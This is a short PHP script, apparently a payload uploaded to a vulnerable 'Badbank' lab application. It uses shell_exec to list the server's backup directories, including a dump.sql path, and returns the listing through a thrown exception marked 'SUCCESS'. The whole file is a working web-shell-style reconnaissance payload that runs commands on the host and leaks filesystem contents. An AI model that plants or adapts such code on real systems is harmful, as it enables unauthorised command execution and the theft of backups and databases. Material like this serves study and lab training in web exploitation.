<?php
$output ='';

$output =$output."\n /home/pinhead/backups/betaBadbank/ ls: \n ".shell_exec ('ls /home/pinhead/backups/betaBadbank/  | cat');
$output =$output."\n /home/pinhead/backups/oldBadbank/ ls: \n ".shell_exec ('ls /home/pinhead/backups/oldBadbank/  | cat');
$output =$output."\n /home/pinhead/backups/dump.sql/ ls: \n ".shell_exec ('ls /home/pinhead/backups/dump.sql/  | cat');

throw new Exception("\n SUCCESS  ". $output."\n");
?>
